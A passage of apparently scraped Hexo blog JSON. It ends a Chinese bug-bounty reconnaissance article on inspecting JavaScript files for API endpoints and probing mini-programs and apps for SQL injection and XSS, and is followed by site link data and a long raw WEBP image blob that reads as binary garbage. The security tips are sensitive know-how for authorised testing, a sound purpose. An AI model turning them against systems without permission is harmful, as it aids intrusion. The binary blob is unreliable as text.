src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979911722-aedd9206-580a-476c-aafe-5e99d91a2d47.png#clientId=u713ba10f-a757-4&from=paste&height=604&id=u785851a2&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1208&originWidth=1148&originalType=binary&ratio=1&size=133350&status=done&style=none&taskId=udc4effe1-a736-4b7d-884e-b10381b8c03&width=574\" alt=\"image.png\"><br>4、火狐浏览器的话，则是在调试中<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980094740-b4afaf82-8f10-4f64-b368-da3faa3f5d93.png#clientId=u713ba10f-a757-4&from=paste&height=323&id=ua48ca828&margin=%5Bobject%2Object%5D&name=image.png&originHeight=646&originWidth=1646&originalType=binary&ratio=1&size=188824&status=done&style=none&taskId=ucae14475-c2e8-489d-98d3-a672350edf4&width=823\" alt=\"image.png\"><br>5、如果你请求的JS文件内容都叠在了前几行的话，下面这个键可以帮你美化输出<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980174451-835cf97c-8c17-4d2a-a372-469073a78281.png#clientId=u713ba10f-a757-4&from=paste&height=269&id=u80fc4db5&margin=%5Bobject%2Object%5D&name=image.png&originHeight=850&originWidth=1420&originalType=binary&ratio=1&size=78688&status=done&style=none&taskId=ud815e24c-4503-40d1-a91c-ae3ec92a358&width=449\" alt=\"image.png\"><br>6、在JS文件中，可以尤为注意带有api字眼的文件或内容，例如下面这里我发现了一个接口。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980516041-202ef7c0-0773-45fc-8ea0-8935ad385603.png#clientId=u713ba10f-a757-4&from=paste&height=427&id=udeb8bb8a&margin=%5Bobject%2Object%5D&name=image.png&originHeight=854&originWidth=1400&originalType=binary&ratio=1&size=199487&status=done&style=none&taskId=ue53b03c2-3b94-4dda-8b57-943ff687ffe&width=700\" alt=\"image.png\"></p>\n<h2 id=\"0x10-小程序、APP\"><a href=\"#0x10-小程序、APP\" class=\"headerlink\" title=\"0x10 小程序、APP\"></a>0x10 小程序、APP</h2><p>web端没有思路的时候，可以结合小程序、APP来进行渗透。小程序或APP的服务端其实可以在一定程度上与web应用的服务端相联系。也就是说，我们在小程序或者APP上，一样能够挖掘web端的漏洞如SQL注入、XSS等，并且相对来说，这类等服务端安全措施会相对没有那么完备，所以在web端确实没有思路的时候，可以迂回渗透，从小程序、APP中进行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#小程序抓包、APP抓包参考链接：</span><br><span class=\"line\">https://mp.weixin.qq.com/s/xuoVxBsN-t5KcwuyGpR56g</span><br><span class=\"line\">https://mp.weixin.qq.com/s/45YF4tBaR-TUsHyF5RvEsw</span><br><span class=\"line\">https://mp.weixin.qq.com/s/M5xu_-_6fgp8q0KjpzvjLg</span><br><span class=\"line\">https://mp.weixin.qq.com/s/Mfkbxtrxv5AvY-n_bMU7ig</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x11-总结\"><a href=\"#0x11-总结\" class=\"headerlink\" title=\"0x11 总结\"></a>0x11 总结</h2><p>​        以上就是我个人挖掘SRC的一些信息收集思路，挖掘SRC有的时候真的很看运气，也许别人对一个接口简单Fuzz，便出了一个注入，而我们花了几天，还是一直看到返回内容为404。所以有的时候真的可以换个站试试，也许就挖到高危甚至严重了～<br>​        作为一名SRC小白，以上内容均为小弟拙见，希望能够通过这篇文章，帮到更多的网络安全小白，没能帮上大佬们真的很抱歉～后续也会持续提高自己，将学到的更多的东西分享给大家。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}],"src_wajue":"RIFF�U\u0000\u0000WEBPVP8 |U\u0000\u00000\u0017\u0001�\u0001*�\u0001M\u0001>�B�J%��$�؋@�\u0012\tgnό��y��iYd/'*����Ƈ����d�/�\u000f)?=�����Ǥ�.<������?�Ϸ>q�3�\u001f����\u001f���?��x�\u001f�k�_�_޿%�!���?���(>A\u0019�[������^ؽC�7����~�}K��O�^��O������s�u�\u000f�\u000b�W����?)>`���{Ǜ������\u0003�u����������(_���w����_�~\u0002���g���;�g���\u001fޯiO�\u001f��p��y\u001e�4㖢\u0014��a�����\u001d�6���Y���<GJ�$+r�wV�2��F��\u001c��g��Qo͙k\\u�}�N�\u0000���~�X,�\u001aN����T��(��ڈ��}��\u0016�\u0011�ό評�\b�`�\"\u00143\u0010򧐭?�>\r��5\"�u\u0006�2h$�+�\u000eo�u|��(\u0015�\u0015�U:�ʄ\u001b�|\u0000�q�@P1D\u001f\"0�#�k�w�Pԧ�c����`kY\u000f۶`�>\u001e�Vdze����a\u00103\u001a�\n\u0004�ckR�m�Y���[�\"����΂��\u0003\r�#��!�.F\t7�����Pf��\u000b�\nc(\u0007�Ӿ��\u0010{�N�ܳF@��\u0007Z��\nT�\u0012���.ݠ�~x���W+☠����\u001a\u0019\u0000� I��m�9KT\\�{�wRz\u0002�/���@\u0002��i{L�0\u000e��\f�\r�e�<ajD\nF\\K��u\u0003R�CeV��\u0018#�W\"1z��3\u0003�N\u000e�\fi�bdX�\u0000�f\u0015�\\��a��5�w�}��\u000e���s���.������\u0014J��!=l��LM{�4p�\u0013����H�[\fy&\u0019hi�\u0016�\u001e\r��=�C��.�}�\u0006}����>\u0003\u0004�\u0019�\b\f��ʩ��)HW���ء#\u0017�w���2&\u0003\u0019z#���8\u0015<�ԍ�Ȍ��%�j\"�.<�gh\u0011ZL\u0012c\u0000��\u001aF\u0002�J1\f��A;:�\u0016;��F��\u0016��b�d8�3�8\u00104�\u001c08\u0003�\u0002��\r\u001a\u0018��b�\b�,��o�S��kͅvi����V�\u0015��8�>�\u000f\u000eK\b<����\u000e��b\u0011���F�\u0013�:\u0007K�P$7�\u0013Ȫ�\u0013oz�r[g\u0013\u0015\u0007�;D�x�\u001cӘ�}�㶅���l\r/4�WM�:8��R�K�\u0015�MNZ���\\k�SO\u0018\u001a6 ޏ��'�g\n���;Ϧ��Yb��\u0011.\"\u0014h-\u001a�>�\u0018�\r�켲�ݗ*ް�?�\u0001$\u0017��\u0005�C�X��cA��(H�2Էݍ��\u001d����!1!�dc�\u001c�K\u001e�29\u0002�Kh\u0004\u0011�V�6L,\u0005�B�ѝ�'�r�·���)��'8�\u0015ܸc_\u0007\n��nVy)ݼB[\u0010���t��0�l\f>uC�q\u0010����q9�T�w���W']\u0005\\o!E�JW\u0014<��>�1\u0018�}�<߼�3$�A(����\f�W\u00199A6�@P��[���VOi8�ܶ�\u001a2+�\u0002�j;l��\u001c~�s\u0006���\u001f���\u001c.\u0001ɓ�\u0013�߾\u0005�@�����y�:(���{�?s/*���\u0001�N�+M�\f��`\u0005O��D�i��\u0003�lwf\u0001�b����0��/W�j�\u0001\"��\u000f�����U�6�5\u0004���G��\u0004\"�ۋ�$���pE�Pؑ\f�b�T��E��b���\u0011c��v�6\t��������_�U\u0000��.0k�$@�m�~�'z�KJ�=v����\u000f���~\r��|\u001bӦ�/�Q��Mi�\u0002����f\u001e��\u0019mo����tQ@̩�n\u0010�,K�~�*\u0016=.\\\u0015�\n\nU\u0015/�ȉ�|T�\u001f�ͫ��&��,\u0004�C��#ed_����3\u00179t\u00038�����\u0015�G_\u0016Kt+?���,�BF3\u00004��Z\\\u0018E�T{�L�x�����\\ύ$�|rQ�����di0f����{;nԨ��\u0010c��{��a�S֊�Fik����i\u0016[�w-q�쒻pԻ�\r�U�I,�.�\u0010vv�>�\u0003�PԾ�V��PI\t�\"\u001f/0韘�]�:U\u0016\u001cᖇ\u0007f\u000b����?�F�*}�����8E���_;�$aNw�\u0013�^h\u001a\u000fm:@�/��J\u0013��V�\u001a�4\u000f}o\u000b/5X�<�\u0013�@���I\u0017B�K\u0019\u0006�\u0001�<���fN{-B&�\u0013��^���<��O�F2b�R�n����\u001a�m�,\u0017\u000fq�G�_��>�?�k3,�\u001aQN�.t�խ�N�=\u0007�QwQOʑ�6`\u0019=Nn�ǨEz���\u0017F�\"�\u001aN���Q�\fߣ^Q_��a��\rB�\u0017����\tB�9##���z�h�/�¿+~�#�S��r�Eoiw��\u0002�7u��J9��r���iB-�(\u001f�c�4\\\u0007\f\n�pu�\u001c?���X���\u000eő�Mz�\u0019w+�q�N�\u0000H�q�!e��8#�t�\u001c�^��}K\bR��4|\u0003���J)�?�=Q\u0010�\u001f��`���s\u0000I�\u0013��?���`��z���@ͺU�C\"��ߢx�[���e\u0011\u0013֖\"\u0016�ch�\u0011��/�\u0000\u0006Z�\u0010D��+�(�H\u001e�L���z�M6\u0000n\u000fi�ņ��F<�\t��H2\tkIe��شB\u0004M\u0001\\�z���;\u0015\u0013$�P���L?�HlP��o�!%�R�9�9��Wck����\u0011G\u000b�nʹ�_ٹ�\u001cQ\u0018�v�'e2�\n!XP*�t��TQD\u0013\u001c��j_<����KȬ\u001c��\u0017�.�9왪G��\f�\u0015Nj-t:Xw\u0003��nv�Cs\r��aB\u0013\u001d\u001e+/�\u0000��\r*{ˌ'���R��͂��\u000e���-�\u0016\u0012\u0017S�����IF�����>�+�ޚ.|f���\u001a�I� Q�#1�S�BzH�\u0000����\u0002�S*_�\u0018�r��Q�:3\u0005A�{_�E&/�J<\u0001�%�a�\u0003\u001e氥��r�d(&ם��c���\u0004\u0002[\u0007�@�\u001b\n=�II,��:�_sx\u0007��P=O�\u001a�a\u0005\\(*W��\u001e;��\u0013�|9�Z=pj�\u000e\\�K��*�tY�4�1c�\f�~�G�\u0006b`�|�MK¢��=BO�厵�`�?Ag �\u0013$�'M�\u000bl�����v�S�\u001a\u0018Ѿ��zVJ\u000f��_�О��\u0018�}\u0000���Τ��6��\u001e?�w��\u0004�+��l\n�ȝSA���\u0017�\u000f�MND�Ӫr�\u0002Mg��9\u0006�Xp�:.�h3R�[�!�ВE��J��pC쒥s\u001c��&�P���w�R�2m\u001a�owѠ��R~��\f�\u001f�G\u001a_Һ�+\u0011\u0013E� ^v�����\u0014�\u0005�V\u000es0Ygr]����Tǆ[��t\u001f~��\f�����lM��ó�\f�:홞2\u000b炇o�jS���Q_�\u0012��O�+����\f{L&\u001c�\u0012\u001aM��?��\u0007Lf�9�^x����t}.,H��SCNԫ�@��z��hn�@\u0013��#��\fއ\u0014\u0015��M�cr�o2�\b}Q�e��W�نb\u000eT\u000b���\b^�ԗ.��_q���c�]�\u0014��OQ+��\u0018�\u00100�1�����ހ�\t\u000b��q�\u000f��p[�y��L��\u0014��b��n��)\u001aY4$'��\u0005q�8\u0001|sV���!�xVړ�\u0000m\nE2~DN\u0013B\u00128�д�\u000e�-�%ڱ\u00024�*�@���\u000e��\u0004�7,���7�l\\�����4�ɿ�#D����\b(@\u000f?����;d��T\u0018%�6�u���\u0015pk��\u001b\u00052�]O噽�G�@�?\u001d\u0013�Q��\u0002\u001bPΘ/\u0015\n\u0006��<�Kz=�x=��=>f(�*\u001f�\r �Ҧ�`#s�nj��ݳjk���pU�=�v��c�z�\u0018\u00041��\u0003/�!X>l��rڱg��K\u0013��T\u0019�4\u001c�v|��5��?�2��Ճ�;�\ta)����#�4�O�$K�\u0015\b��\u0002\u0014�%\u0004�\u0005\r]Fŋ �b9\n�Қ<��� ���\t�\u0010N���\u0019��\u0019�$ǔF\u0002\u0006�L�:؎v��$(\u0005�\u0016Ê�\u0014\u0010݁!\u0015WoD7�˓��;H=*�6Tv:\u001c� e��G��$�)�\u0014��\u001fG�'�\u0012�|zF�4����D\b6%\u001cժ���,<1\u000b\n:\u0005�r�^��Y�Jx�\"n�Ɯ���)t�C�\u0000�i\u0017��a�+\b\u001f�{n�B-�%\u0001A�2,�Gp�r:�w5\u00006m)��1�W!\u0000\u001f\u001d�{Ĥ&\b��\u0014����KN\u0000ҕ�w]'�\u001a(�\u0005�5�\u000e\u001e��=��\u0019l\u0015\"�&�E����y�D׬�\u0012#w\t(0Z�h�\u001aj�o�\u0012\"*�2l���E�]\tqM��fDw�\\oqi=L��\u0018NS`\u0007\n���6i���\u000fg�gK5��\u0001��2�d\u001d�\u001bNG\u0006V\u0016��\u000f-A���-V��a`Yh�^tZ���\u001eI�s\f����@\u001fkn~�,լOK���:��/\\^\u0016�-aP\u0006��\u0010S>����\u000e| ���v\t~��Յȡ�Hm\u0002\u0007����\b�\u001b�~Q\u0007Y\u0005��q\u0005�v\u0007�v\"�2�:��:w6}��/�t\u0000�\b��bǆ!�mƺH�������\\C\b�aƮ\u000b�����R\u0013��qg@�\u000b�$�\u0013�BJ��\b\u0015��Д�a�`'0;\r\u0005�Êc�\u001e����)Ys�.�/Q�D�\u000es\u0013����\u0013�R����|0�&\u000f'��m�\u0019�\u0001\u001a�ק\n7hkx�����gCI�9\t�\u0000����\u001c�sF�\u0017�\u001e���!����']��\u0004')X��u�;a0:�#\u00193/F�!X�C}��'�h�(4V\u0001�\u0006��\u0007�`�]��ȟ�P-���`\f\u0014�12�jA�R\u000e)r;�!�\u0010�Z\u0002Y��l�\u0000�\u0012R�\u000b���+\u0001\u001ekG/��\u001d��g�q��=��;Q�#\u0003|�\f�H��c�[�ǝ3=^oK+���<w�\u000fYA\u000f��}�c����\u0012sg\u000f��亪R\u001eŖ~�ɍ�n�+\u0005��̚����(\u0003�'3�h\b:.^tEAе��v�Rүk:�\u001d�ѡ��W��5�2ҡ���\u000f��|\u0000`\u0007�����<DsW����\t�y>\u001c\u001f��7Ay�r�۰S���WǓ\u001b�\u0016yq/U�e��ܰi�-`9� ���6̇\u001a÷����v\u0010^��H���]���W����5�\u0019��\u0006�.d�>B�\u0016�\u001f?��\n��Bx��H\u0000\u0007���v��ǐ\u0007\\;\u0018�\u0014�P���WQ�\u001b2�x.�h�0����\u0018 �]8��\u0019��cSx��e�\u001bҿG3�J\u0001\f��.\u0006,�\u0006x�ڋt�ۺ�]9\u0007�|$c\u001e\u0017�cͅ9�\u0001�Ս��Qp���JW��:�q�l�1Su���q�\\L:\bl�%�Od�2iU�^�%��Ŝ!#\fP�T�2\u0001\u0010`�l<k\b�d��zA����eĭY�b���t�d��!������\u0004�P�3�^�+�\"M�t�͓�X,f\u000b,\u0001\u0019I��W�Sٯ�\"����l;�Ƿ���7�\u000bD��ҹfg��f\u0013��-�\u0018��\f,ŕ�\u0011\u0006^\u0012�\u001b�2hQ�H\u0000s�Mm{G�jT�Å��H\\Ţ����*%��\u0005��z�f\u0002m��\nd�|B�L�'o��RB�mn~\u0004*\u000f\u001a��L?�V\u00016\u0017�Wn��\u0006L_�\u0004k-�D,\u0006�2�p5Ѹ\u0002]\u001eb��b6:\n��!yw~@��D�e�&����ɪ��|G�\u000f`#��7\u0006|kxGmi&����\u000e�\u0005d�\u0004�l3��$\u001e1��.�\u0007W8�\u0003�A�ԝ\u0012����~�#Y���\f�\u001b:�>̴�\u0005�.4K$}��K\u001e!գ�\u0002�W�0s�9rn;�\t�N\u0005\u001b=q�3�\u000e\u001a�3�s��.\r�y��5��v�m/���\u0015�\\�J�\u0013�3)��������p(�gpXE�\u0010��O��5�'_���l\u001bL�3�$�k=-���p��\u001b��\u0010_�ؑ\u0004[�\u0007Ѿ[�\u0017\u001dx�\u001dv�\u0019��r\r-�>7$kv��y�\"�\u001c\"�\u0007���Ӯ���F�\u001f\f�g��\u0019�����\u0004:*\u0007��U]@�i��K\u0005�ߓ^\u0015��5�rsڀN�r`����kZ6 jx��\u001e�߻�x\u0012�K��ᮝ'�Ż�\u001a=vn���7��+ȝ��U���=\u001bX�G]*1W�7�f0�x����%�������K���FF��\r[�;���]h\u0016��r��WW�\u0016\b�\t\u00178�Ce8^(-\b�b8&�\u0007��,��*g\bm�\u0005}\u0010�H[=�P��\u000b�(�\u0004m��BKp��L�Ԥ�4�\u0018���M�3R��|(Qe��\f�lF�\u0015jZ� �jj���u��|�j��\u0003�AH�\u0004���7:]l6v)E�4\t-1������Gkn7����a\u0015�.�+���E!k�-����ۈ�\u000eܪ���q�Z�бh6��e�\r\f]�;]�טAc�����J��V2i2)\t\u0016��\u001d��+�-��\u000e\u001a�2h��q��\u0017\u0019�\u0010 \u0015?\u001b���\u0002\u0018��\u0014\\�Z8/&[�%�L�+WU�H�\u0010\u0014�3�\u0001%e%R#\u0004E{΋�e�9����p�Y��Y(����\bR;\u0013/�\u0017��T��2U�\u0010�rQ��;�\n\u0003�Zd�\fh4�cfT�O>]����G�By�ȥ\u001b�`�`�\u0005oF-�d�\rr^\u0017Rg�c���\u001a�*'�m@h����\u0017\u0007�#Sn�x'\u0011�$ؙWڸ���:�à�l\u000f�,���}�`�ǒNe\u0017�u��?7x�|\u0000�\f56��\f��\u0017{��]H\t��7�ۈ�\\��t\u0014����G$�O\u0000Ȟ�1�H#f{�\u001e�\u000b��\u0010�\f��#H\u0012\"QҰ�.��?˼~\u0016\u0015\u001eY�E\u0014\u00130N\u0007�5OP]�x�\u0001�n)��(�\u0018pq]�\u00104�4(��\u0002��\u0018}v�\u0002�1\u0015\u0019��N\\_���[\u0018 ����ꕽ+WN�{\f8�9<�W\u0001b� ?�\u000b��+G��ؕ�n�-4�7\f�\u00048te�7�\u001b�4\u0000{��o�4\u0014�]\u0018�\f<pmt��M`vw�M2?+��X�����\u001d�9�o�#ڀ���@\f�.��I��]M���_b��\u0010,��\u0003��ʾ�\u0015\u001f�\u001632Ea2��\u001b���+m�JR�p\u0005&H��o\\O�LW\u0014\u0012�P���\u0019�>8�C3r�\\l�>?\u0016�S���뀇7��\u0001��bKk���\u0018�/����Q!>�\u0003JY��\u0011v�Rx���j�z\u001fk�;���4�*�����\u0012\u0019\u0010��\u0006��5\u0001\u000f��=��%���8dӦ�at���\u00011����\\�����ܽ�\u000e�\u001a���-gэ�l\u000ea�\u0005���B�V��h�� \u0018o�Hh\u001e\u0011�4t�\u001ej��s9�냚i#��Gt,�Q�߅`Z�'7���lh�k:��eWC����|zui\u0017#�*n|\u0014+�5��\u0016Y�@6��l���Or�:�Y}��X���\u0010GJ�\u000f@�\"\u0015�J��\u001dK ~���<ˣ�\u0003u\u000e�\u00027��\b\u0010V����T�\u000f\t�)h\u001f�Z���=�G^���5H� ÓW��?i�y��\u0005h\u0002\u001f�m\u0019��O��\f��n|77J�H�p��\u0010��4\u001f\u0015�I���̞�:\t�K��m����Fy\r�/�\u000e߭��\u001d!%��\bv��\f%T\u000b\u0000d�+�\u0014�xH忕-E����εF�}��*����:��\u001c\u001e�A�Wf��{*����\u0005�\u0018�2zsf�����/\u0015��-��̹�bc+F\u001bs\u0013|G�?Un��\u0003\u0019�v�����\\\u0007\b1\u0007\u0014\u001b*4�\u0013�>!�|1\u0018w���Ӝ���\"E�?�\u0019����.)�[�R �~�����\u0004�J��Y��h|��\u0010\u0007\u0007����\"��8Y.D���G�L�3z\u0019E\u00129�|5�PE��{��Ccag��a���i\u0017\u0010�����\u0005�貀�\u0001���\u0004����y҄g��\n]�\u0014#��\u0006�\u0011%Y��5w_\f�m�\f�\u0011\u0013}\u001d����\u0010v9�a������\u001c�\u000e)�\u0001A����N\r>���=s�H\u0000=�_W\u0000+%���N\u000f\u001dZZÊ����N�,t��Ä���(��F�X��)�א�k�\u001d\n�Õ�B=Ԏ�\r� x��$io�i��b�ٜXDPN�^b+\u0007#��'�\u0017�\b�+\u000e3i�\u001cl\u0004��\u0002U�t�\u0000vX\\�>�\n/�g\u00010���E\u000f<q�6��s9��\u000fj���BN����>��\u00168�8S\u001b,-�\u001bc\u001a�1w5BK��1�f��ux i�v�~����?�lS����/���X�\u000b�YH�\u001d���\u001fg֥���`��bV�Ί%\u0003���宠\u0002������Ͽ�m�Q��\u0014DIf���\u0013�\f���Hǂ��@\u001b'�\u0004��\u001eC�=��ZYem\u0011v�K�{�W4��h�\u001dGꘐ�\u00012\"��\u0012��\u0015��x_��*^�b��AX�v��\u00034�\u001e�`2�\u0002x�`��>-1��\u0010\u0005E�)�v�/B����IŴh���le`5G\r\u0007ղ���A(F)׫�I;�fU\u001d\u001cT���]jg�\u0016\u0011�\u001a\u001b�����\u000e��}s�\u0014��^)�Z�ض�\u000b�|ܩ�\u0012\u00002\\��\u001c1�7�^B����'�:rh�S\u0015�1H�n$�\u0019}\u0018`�#�]�Zb��,\u0003�\u0015��.5���B�퀆\u001e��y;�1�O礄5\b\u0010��p\u0001�o%LB��s�K\f�RqP��4�9B�pҘ�I9���\u0010�&�5�D��@:�b�U�}�\u001e�мz1\u0001+��,ĶU�\"�=J��\u0012���\u0018�;1L�Å+�)�@f�s$\u0000�F}��fig��'��ڙ�ո�z��_��\b�*�!�\u001f�6Nʜ`�0Ϥ\u0005\u0011X�`���$�\u001d����``Eڮ�c���zゥv�G��E���F��Y�J]�'a�C]@U�m�J���oav�)\u0014t�N\u0002�Y��,�~5�)\u0013�a�H6b\u0016�\u0007��\u000f�\u000fn\u0002]>�f�&\u0010�{~��{H\u0001=���\u000bAr��\u001eK��l+{\u0007lU\u001f�\f\u0000�1L��i/\r�`\u000e�1x���|^\u0014сsΒ�ަ#͠�<�}��\u000e�\u0006%'?�fP0�~DJ2`Q���O����z�\u0003�z��g�\u0014*#Y�@\u000b�[�Z�\u0014�\u001f��M�>�Y\\v(���'D\u0013D��\u000bi\u0013��[�Ov�n\u000f,(���Ě̄�ݐ2(��aZ/i�+��y�\u0016���Q�vG�ȝ\u001b�a\u001f_2?d�\u001b&�=!��%@�g�3\u0006K^w�݉=�k�\u000fT��2Bw�j.�-)�t��i�+���O������4KǬ�_,ay\u0013��\u001bp����C�kC\u0017oI�EsldG�*��#؀��\u0006L�֥���k.*Auߤ����R0�?�s�\n�\u0012[r�\u0000�٘�^�~�\u0018p�A��2��\u00174\u0010~joI�h�s8A�ȋ&\u0007�a5���\u0001<45���T타�8#���ܧ���\u0019fb\u0018[��A�i\u0014\u001a*��ju�H��{���?G��{�X\u0018\u001dC!�]�\u000f�\u0004�ĩى=3a\fpŏ\u0002\u0011\u001c�A!��l\u0016�\u0017��\u0014�8�/�+,kByz�p\u000b>�p�Uh�L���\u001e����~�b��ض��\u0014\u0017ת\u0018X�v\u0012��e; \u0004��$�On4�\u0010#1^�\u00165ή��\u001c6[t{}�(P&@l�\u001bD,�D�r)�˓�[�\u001f�\\M�{\u001cj\u000b��\u0014?��d�n\u001d�,\u0004�0�������)3$��\u001e\u001cΧ�F6\u0015O\u001f���\u001cb[�:Ť\u0007�!��_{\u0019__-f/AR%)��#���~4�u�R�m_��:�7��\u0013\u001e�tf�\u0010�So�>�desI��\u001e��&��� \u000b�\u0003ګ\u001f+��z\bɦ�\u0000�-Ӛ��if���; ³�������Y�b�\"f6v��)�\frӬw�x�ѣ�C!{\u0000d��\\|\u000b+i\u0007I�\u0014��֒/C-�\u0014��\u0004L�\u0000m-�x���L�Ä�����w7-�;́=>��h9����\u0001Ѓi�kA��\u0007�j�^9���\u000b�\u0002�z��6�����[�~�姎ȜH�Y�5y�fC&�v!Ϟ���t�D���\u0003h��\u00184cƥ!����3<��e�v��ɧ����W���v�>6�)m�n�\bj#�4�e��\\���y�\r�\u0003Ʌ��Ј�FQۇ�`��.K%��)���=RF�5�a���N���U&�h�����+bT\\\u0016J\u001f�aH����\u0000���\u000b\u0017���\u0019[0�˪�\u001b��\u001f:&���\u0012�@��\u0016�����_^ҏCX��\u0001�U��X�mD�H<�N��\u001b�m����,�[�T��y'�\u0006�\u0000�L��+��\u001d�ޠA{@Ɲ�yk��jF\u001f�d�3�g9&\u000b��|5\u0016���=����s��\u0000$��QI��r \u0002��?�Fbj�����/�S0#�}j��j�\u0014��\u0010:ȴ�t�<�7\u000bQ�@�������\u0000\t\u0011�@м�39���\u000b��\u0017 L\u0002�k�n�5~�\u001e��\u00117�M\u0011iH�\n\u0019G���)I�՚�\u000eѷ�U�k���b����V�S�܁>7\t�G\b�Q��cf�\tЋ�\u0006{�1��!ݱ�n~Tӆw�:�O��\u000e��@vo\u001e�V��{��������b�͉�w,\u001b�b \u0006��҃\u0002��\u000bjl(�\fu�l�/E\u0000\u0014�N�oy�|���W4aŇw��\u0012���?�\u001b�Me]>%�\tQ���5\u0005�I/䜽w+e��&阨s�5�����)��\u0004�{/Ꞩ\u0018��G�׃�Hw޻@��0���kd�t_�\rݜў����\u0005�xv\u001b�W\u0006�/�&\rk6�\\̴#�&�\u001eQ\u000ex�cS\\�,�81�J��\\�\u00060�2B\u0001\u001f�)�h���\u0001����R�.��\u0004Y?C���8���Ω�>�:A�j�H�\n�ʔ�D\u0005��w�\u000b/�N�p\u001c���e�3\u0004�����Us���\u001ajr�\u001f\u0013�t=�z̟�\u0004�2A��uD��.H��͇ɲF\r�԰�-�\u0000}e���4.��gj8\u0007�\u001b3\b��ҋp�ܬ�J�\u0010}������$Q.��?�\u000b��a�y��̮Xm��\u0004�CR{Q�������)�\u0016v�n�v,\u001bN�q���V\u00105d��.o�`�X\u0013���y�]%�o���88\u0005\u0010�T\u0006)��60\u0001ז�2�W�\u001d鮋\u0010�\u0014���\u0011�����\u0007t��#DX+2�\u0004�\\};\bN�n�s/f˵��#�6e�vl:�W����W�ޥ󹂜�*����Al=z_�X�G�#3+�L]�ݒ�\u0003��f�O�g<GG,`\u0014\u0001�!\u001aW���4�o\"\u0012\u0000��e�ܗ�9���\\&\f�`��\u0016���\tz��<*����t-#J`��\u0011جM\u0004�\u0012�m@���\nvS�h\u001f��5̊\u0003.Fzb9�_���}��\u0016]�=g�:a�ߞ��;4�D�g�ن\u0016�p�Qؼ\u000b�U$\u0002U�\u0003���s7\u000f\u0018��\u001e:�\b��\u0002k�R��i}3\u0007�\u0012f�o�l���\\��B���7�^`�5{�\u000b��77�\u000b7�tZaqw$�+�\u0000a��*M\b%?j��#��3�,<���^џ\u000bG���Ko��\"[\u0003Q8�\n�]���n��R��;\u0001'\u000fV�4�p�B\u0014#L\u0007�)�K��:>���\u000e�\u000b��M5�Ҵ\b��M<.N�,�Ԯr\u0014в�'�z�RAi������;V\u0013��u��\n����Y�}�y\nwՔ�H�Eu~M\u0002V���\u0001ye���\u001f�x��W��\u001d�\u0017\u001a5/@w��`\f��\u0001\u0004՚�k���x�X�M���7L�\u001b�\\y�F �joS\br�Qy���b۷/�3�pvz��ퟘ���g����Y�F:� A�s�z���o[l�+=�g�cA \u0006����G�L�)���L��`�F+��\u0003^>��W5\u0014̘��b\u001f�κ��,�#d�\u0010�|�\u0012�g6���|x\u0013�m�\u000fYp\u0000�\u0003n.������+)K\u0011F\u0007\\���+\t\u001d�*�ϙ��$��݄�s� �Y1��\r竉��y�Ej?�9�\u001ea�d����\n�y��@�\u0002R�C@S�=�D7�g�7\u0012�zЉ6�>���x����$K9�1�}*�i��� C\u00103ޗ�YM(v�o:-\u0015\u0018}�eoI,r���cw�@L���q\u0016�5��\u0003�\u0015�5h\u0013\u001f\u0005n\u0007�<\u0010��&��wVWD�\u001f����d��J�;�XXH���o�\u0005h\u00133\u001b�\u0000SҰ�\u001a*���\u00121����:\u000b�\u0014\u000f�/&��ץ0�3T�ծ���F΢\\�A������\u0002��9�.�L<\u001c\u0007x-Ot\u0001�\n\u000b4��S��\u0001Y\t`�H��R���^K���֟?��QD<.\u0019�͐��\u001b���(ɞ��!�\u0016\u0018\u0002\u0000��Q�2i\u0003Dm\f,��#<7?^��R�\u0013ȼEƆzct�S3��Xk�ʌ��\u0002����\u000f$#�Nҙ�`���U����u�\u0003O��ݺ\u0011Er\u001a�7Y����4�8�Nu\u0000�P~i04čF� \u0018��\u0012�!���\u0018���u\r\t�-�O��͙!�0ցM[֨�`�[<v��N�y��J�\u001d/\u0013�\u000e\u001b�]h)�\u001b��U��\u0007���%+I��[Aw�q���@�Y�P(W��\r ��pDs���b�\u000e��MC�}\u00180�{|(%\u0014!��ÿ�aO5�p5����/�S�(\u0019|�t�=v�{�?g�Iď��U|�E7�\u0016�)\u001f�b�:�-�$��VS����W�6�\u001e\bI����\t|�����_�����,\tI�o]�\u000f\u0015�U\u0011kc�cQͣ�y�\n\u0005�7ۼ���,\u0015���o8���ܮ����p�uq!\u0000&j\u000fB�%�$r<Yb��B�E�\u0012<��.\u0015\u0015�\b�ҺPt\b/�5��L�6��\\��\n\u0017��¬TE-��3U�T���G\u0019_\\Q!�\u000e\u0003�F�٧�L\u0000~�t�L��ry�F�l���\"��\tݝrK���8��@?r\u0015m�\u0007�{\u0018�1�����b��^�U�b���\r\u001f�:\u000e��l\u000b��rq\u0013\"Mu�՗����J\b�\n�^2�:\u001cQi�TΆ�\u0000\u000e)�޳�x�c#�\u0007X,�\u0001�9\t�=\u0018U��87�/��p�\u0002��:�`��=�>�H�e���R�Ӥ��lF�2#~�\u000f�$5\u0017L���J\u001e�=\b2\b���d�\u0005\u0017E\u00070�� 